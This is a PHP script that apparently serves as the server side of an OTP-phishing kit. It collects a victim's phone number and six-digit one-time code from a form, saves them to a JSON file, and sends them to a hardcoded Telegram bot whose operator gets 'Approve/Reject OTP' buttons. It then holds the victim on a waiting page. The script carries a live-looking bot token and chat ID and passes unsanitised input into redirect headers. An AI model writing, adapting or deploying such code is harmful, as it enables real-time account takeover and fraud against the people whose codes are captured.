<?php
// ===== 1️⃣ Get OTP data from form =====
$id = $_POST['id'] ?? '';
$phone = $_POST['phone'] ?? '';
$otp = ($_POST['d1'] ?? '') . ($_POST['d2'] ?? '') . ($_POST['d3'] ?? '') .
       ($_POST['d4'] ?? '') . ($_POST['d5'] ?? '') . ($_POST['d6'] ?? '');

if(empty($phone) || strlen($otp) != 6){
    header("Location: otp.php?phone=$phone&error=1");
    exit();
}

// ===== 2️⃣ Save OTP status to JSON =====
$file = __DIR__ . "/status.json";
$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

// Mark OTP as pending/submitted
$statuses[$phone]['otp'] = 'pending';
$statuses[$phone]['otp_value'] = $otp;  // optional, store the actual OTP
file_put_contents($file, json_encode($statuses));

// ===== 3️⃣ Send OTP to Telegram =====
$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
$chat_id = "6057287429";

$message = "🔑 OTP Submitted\nPhone: $phone\nOTP: $otp";

// Inline buttons for approve/reject
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Approve OTP', 'callback_data' => 'approve_otp_' . $phone],
            ['text' => '❌ Reject OTP', 'callback_data' => 'reject_otp_' . $phone]
        ]
    ]
];

$payload = [
    'chat_id' => $chat_id,
    'text' => $message,
    'reply_markup' => json_encode($keyboard)
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($payload));

// ===== 4️⃣ Redirect to OTP waiting page (include phone!) =====
header("Location: otpwaiting.php?phone=$phone");
exit();
?>